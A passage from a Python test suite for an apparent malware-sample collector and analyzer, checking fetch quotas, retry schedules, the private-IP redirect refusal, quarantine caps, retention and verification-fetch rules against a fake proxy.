    assert proxy.seen == []
    used = await rows(owner, "SELECT used FROM enrichment_quota WHERE provider = 'collector'")
    assert [r.used for r in used] == [0]
    assert (await rows(owner, "SELECT count(*) AS n FROM fetch_attempts"))[0].n == 0


async def test_daily_and_hourly_quotas(owner: AsyncEngine, factories: Any, tmp_path: Path) -> None:
    coll_f, _ = factories
    store_dir = tmp_path / "q"
    for i in range(5):
        await add_indicator(owner, f"{HOST}/f{i}.sh")
    files = {f"{HOST}/f{i}.sh": Reply(body=SCRIPT + str(i).encode()) for i in range(5)}
    proxy = FakeProxy(handler_for(files))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        s = settings(tmp_path, daily_quota=3, hourly_quota=100, quarantine_dir=store_dir)
        store = Quarantine(store_dir)
        store.prepare()
        clock = Clock()
        svc = CollectorService(s, coll_f, store, gate, clock=clock)
        done = await svc.step()
        assert len(done) == 3
        assert await svc.step() == []  # the daily quota is spent
        used = await rows(owner, "SELECT used FROM enrichment_quota WHERE provider = 'collector'")
        assert [r.used for r in used] == [3]
        clock.now += timedelta(days=1)
        assert len(await svc.step()) == 2  # a new UTC day, the rest go through

        # hourly: attempts in the last hour count, older ones do not
        await add_indicator(owner, f"{HOST}/g1.sh")
        await add_indicator(owner, f"{HOST}/g2.sh")
        files[f"{HOST}/g1.sh"] = Reply(body=b"g1 data")
        files[f"{HOST}/g2.sh"] = Reply(body=b"g2 data")
        s2 = settings(tmp_path, daily_quota=1000, hourly_quota=2, quarantine_dir=store_dir)
        svc2 = CollectorService(s2, coll_f, store, gate, clock=clock)
        assert await svc2.step() == []  # two attempts in the last hour already
        clock.now += timedelta(hours=2)
        assert len(await svc2.step()) == 2


async def test_retry_schedule_then_failed(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    await add_indicator(owner, f"{HOST}/flaky.sh")
    proxy = FakeProxy(lambda u, h: Reply(503, body=b"busy"))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        clock = Clock()
        svc = CollectorService(s, coll_f, store, gate, clock=clock)
        waits = []
        for _ in range(3):
            assert [o for _, o in await svc.step()] == ["http_5xx"]
            t = (await rows(owner, "SELECT status, next_attempt_at, attempts FROM fetch_targets"))[
                0
            ]
            assert t.status == "pending"
            waits.append(t.next_attempt_at - clock.now)
            assert await svc.step() == []  # not due yet
            clock.now = t.next_attempt_at
        assert waits == [timedelta(minutes=15), timedelta(hours=1), timedelta(hours=6)]
        assert [o for _, o in await svc.step()] == ["http_5xx"]
    t = (
        await rows(owner, "SELECT status, next_attempt_at, attempts, last_error FROM fetch_targets")
    )[0]
    assert (t.status, t.next_attempt_at, t.attempts, t.last_error) == (
        "failed",
        None,
        4,
        "http_5xx",
    )
    attempts = await rows(owner, "SELECT outcome, http_status FROM fetch_attempts")
    assert [(r.outcome, r.http_status) for r in attempts] == [("http_5xx", 503)] * 4


async def test_final_outcomes(owner: AsyncEngine, factories: Any, tmp_path: Path) -> None:
    coll_f, _ = factories
    s = settings(tmp_path, max_bytes=2048)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    files = {
        f"{HOST}/gone": Reply(404),
        f"{HOST}/big": Reply(body=b"Z" * 10_000, chunked=True),
        f"{HOST}/loop": Reply(302, headers={"Location": "http://127.0.0.1:1/x"}),
        f"{HOST}/ok": Reply(body=b"fine"),
    }
    for name in files:
        await add_indicator(owner, name)
    proxy = FakeProxy(handler_for(files))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        await svc.step()
    got = {
        r.url: (r.status, r.last_error)
        for r in await rows(owner, "SELECT url, status, last_error FROM fetch_targets")
    }
    assert got[f"{HOST}/gone"][0] == "gone"
    assert got[f"{HOST}/big"][0] == "too_large"
    assert got[f"{HOST}/loop"] == ("refused", "ip_forbidden")
    assert got[f"{HOST}/ok"][0] == "fetched"
    assert [u for u, _ in proxy.seen if "127.0.0.1" in u] == []  # the private hop was never sent
    # no new attempt for final states
    assert await svc.step() == []


async def test_quarantine_full_stops_fetching_but_keeps_recording(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path, quarantine_max_mb=1)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    async with owner.begin() as conn:
        await conn.execute(
            text(
                "INSERT INTO samples (sha256, sha1, md5, size, first_seen, last_seen) "
                "VALUES (:s, 'a', 'b', :n, :now, :now)"
            ),
            {"s": "c" * 64, "n": 2 * 1024 * 1024, "now": NOW},
        )
    await add_indicator(owner, f"{HOST}/new.sh")
    proxy = FakeProxy(handler_for({f"{HOST}/new.sh": Reply(body=SCRIPT)}))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        assert await svc.step() == []
    assert proxy.seen == []
    assert (await rows(owner, "SELECT status FROM fetch_targets"))[0].status == "pending"
    detail = (await rows(owner, "SELECT detail FROM enrichment_status WHERE name = 'collector'"))[
        0
    ].detail
    assert detail["state"] == "quarantine_full"
    assert detail["quarantine_full"] is True


async def test_disabled_collector_is_idle(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, ana_f = factories
    s = settings(tmp_path, enabled=False)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    await add_indicator(owner, f"{HOST}/a.sh")
    proxy = FakeProxy(handler_for({}))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        assert await CollectorService(s, coll_f, store, gate, clock=Clock()).step() == []
        assert await AnalyzerService(s, ana_f, store).step() == 0
    assert proxy.seen == []
    assert (await rows(owner, "SELECT count(*) AS n FROM fetch_targets"))[0].n == 0


async def test_refetch_only_when_seen_again(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path, refetch_hours=24)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    ind = await add_indicator(owner, f"{HOST}/rot.sh")
    bodies = [b"first version", b"second version"]
    proxy = FakeProxy(lambda u, h: Reply(body=bodies.pop(0)))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        clock = Clock()
        svc = CollectorService(s, coll_f, store, gate, clock=clock)
        assert len(await svc.step()) == 1
        clock.now += timedelta(days=2)
        assert await svc.step() == []  # not seen again: no refetch
        async with owner.begin() as conn:
            await conn.execute(
                text("UPDATE indicators SET last_seen = :n WHERE id = :i"),
                {"n": clock.now, "i": ind},
            )
        assert len(await svc.step()) == 1
    samples = await rows(owner, "SELECT count(*) AS n FROM samples")
    assert samples[0].n == 2  # a new hash behind the same URL is a new sample
    assert (await rows(owner, "SELECT count(*) AS n FROM sample_sources"))[0].n == 2
    assert (await rows(owner, "SELECT fetches FROM fetch_targets"))[0].fetches == 2


async def test_retention_removes_files_but_keeps_rows(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path, retention_days=90)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    await add_indicator(owner, f"{HOST}/old.sh")
    proxy = FakeProxy(handler_for({f"{HOST}/old.sh": Reply(body=SCRIPT)}))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        clock = Clock()
        svc = CollectorService(s, coll_f, store, gate, clock=clock)
        await svc.step()
        assert await svc.retention_pass() == 0
        clock.now += timedelta(days=91)
        assert await svc.retention_pass() == 1
    assert [p for p in s.quarantine_dir.rglob("*") if p.is_file()] == []
    sample = (await rows(owner, "SELECT stored FROM samples"))[0]
    assert sample.stored is False
    assert (await rows(owner, "SELECT count(*) AS n FROM fetch_attempts"))[0].n == 0


async def test_analyzer_records_a_missing_file_and_a_tampered_one(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    _, ana_f = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    async with owner.begin() as conn:
        for sha in ("d" * 64, "e" * 64):
            await conn.execute(
                text(
                    "INSERT INTO samples (sha256, sha1, md5, size, first_seen, last_seen) "
                    "VALUES (:s, 'a', 'b', 1, :n, :n)"
                ),
                {"s": sha, "n": NOW},
            )
    # a file whose content does not match its name
    path = store.path_for("e" * 64)
    path.parent.mkdir(parents=True, mode=0o700)
    path.write_bytes(b"not the right content")
    svc = AnalyzerService(s, ana_f, store, clock=Clock())
    assert await svc.step() == 2
    got = {
        r.sha256: (r.analysis_status, r.errors)
        for r in await rows(
            owner,
            "SELECT s.sha256, s.analysis_status, a.errors FROM samples s "
            "JOIN sample_analysis a USING (sha256)",
        )
    }
    assert got["d" * 64] == ("failed", ["file_missing"])
    assert got["e" * 64] == ("failed", ["hash_mismatch"])
    assert await svc.step() == 0  # failed samples are not retried forever


async def test_concurrent_fetches_cannot_overshoot_the_quarantine_cap(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path, quarantine_max_mb=1, max_bytes=800 * 1024, concurrency=2)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    files = {}
    for i in range(2):
        await add_indicator(owner, f"{HOST}/c{i}.bin")
        files[f"{HOST}/c{i}.bin"] = Reply(body=bytes([65 + i]) * (700 * 1024), chunked=True)
    proxy = FakeProxy(handler_for(files))
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        outcomes = sorted(o for _, o in await svc.step())
    assert outcomes == ["ok", "quarantine_full"]
    total = (await rows(owner, "SELECT COALESCE(sum(size), 0) AS n FROM samples"))[0].n
    assert total <= 1024 * 1024
    assert svc._reserved == 0


async def add_verify_target(owner: AsyncEngine, url: str) -> int:
    """A URL leased from the hub for verification (M32): depth 0, origin network_verify."""
    async with owner.begin() as conn:
        row = await conn.execute(
            text(
                "INSERT INTO fetch_targets (url, scheme, host, depth, status, first_seen, "
                "next_attempt_at, origin) VALUES (:u, 'http', 'files.example.test', 0, "
                "'pending', :n, :n, 'network_verify') RETURNING id"
            ),
            {"u": url, "n": NOW},
        )
        return int(row.scalar_one())


async def test_verification_fetch_never_follows_links_or_creates_indicators(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, ana_f = factories
    s = settings(tmp_path)  # max_depth=2: depth alone would allow a child target
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    proxy = FakeProxy(handler_for({f"{HOST}/v.sh": Reply(body=SCRIPT)}))
    await add_verify_target(owner, f"{HOST}/v.sh")
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        assert len(await svc.step()) == 1  # fetched with the shared quota and every guard
        assert await AnalyzerService(s, ana_f, store, clock=Clock()).step() == 1
    assert [u for u, _ in proxy.seen] == [f"{HOST}/v.sh"]
    assert (await rows(owner, "SELECT count(*) AS n FROM fetch_targets"))[0].n == 1
    links = await rows(owner, "SELECT kind, target_id, indicator_id FROM sample_links")
    assert {r.kind for r in links} >= {"next_url"}
    assert all(r.target_id is None and r.indicator_id is None for r in links)
    assert (await rows(owner, "SELECT count(*) AS n FROM indicators"))[0].n == 0
    spent = await rows(
        owner, "SELECT count(*) AS n FROM enrichment_quota WHERE provider = 'collector'"
    )
    assert spent[0].n >= 1  # the shared daily quota was used


async def test_a_local_sighting_keeps_the_normal_analysis(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, ana_f = factories
    s = settings(tmp_path)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    proxy = FakeProxy(handler_for({f"{HOST}/v.sh": Reply(body=SCRIPT)}))
    await add_verify_target(owner, f"{HOST}/v.sh")
    await add_indicator(owner, f"{HOST}/v.sh")  # the node's own sighting of the same URL
    async with proxy.running():
        gate = await open_gate(proxy.url)
        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
        await svc.sync_targets()
        origin = (await rows(owner, "SELECT origin FROM fetch_targets"))[0].origin
        assert origin == "local"  # local interest wins: children and indicators are allowed
        await svc.step()
        await AnalyzerService(s, ana_f, store, clock=Clock()).step()
    hashes = await rows(owner, "SELECT count(*) AS n FROM indicators WHERE type = 'hash'")
    assert hashes[0].n == 1


async def test_verify_rows_are_refused_when_the_role_is_off(
    owner: AsyncEngine, factories: Any, tmp_path: Path
) -> None:
    coll_f, _ = factories
    s = settings(tmp_path, verify_enabled=False)
    store = Quarantine(s.quarantine_dir)
    store.prepare()
    proxy = FakeProxy(
        handler_for({f"{HOST}/v.sh": Reply(body=SCRIPT), f"{HOST}/l.sh": Reply(body=SCRIPT)})
    )
    await add_verify_target(owner, f"{HOST}/v.sh")
    await add_indicator(owner, f"{HOST}/l.sh")
    async with proxy.running():
        gate = await open_gate(proxy.url)
        await CollectorService(s, coll_f, store, gate, clock=Clock()).step()
    assert [u for u, _ in proxy.seen] == [f"{HOST}/l.sh"]  # the local target still runs
    row = (
        await rows(owner, "SELECT status, last_error FROM fetch_targets WHERE origin <> 'local'")
    )[0]
    assert (row.status, row.last_error) == ("refused", "verify_disabled")
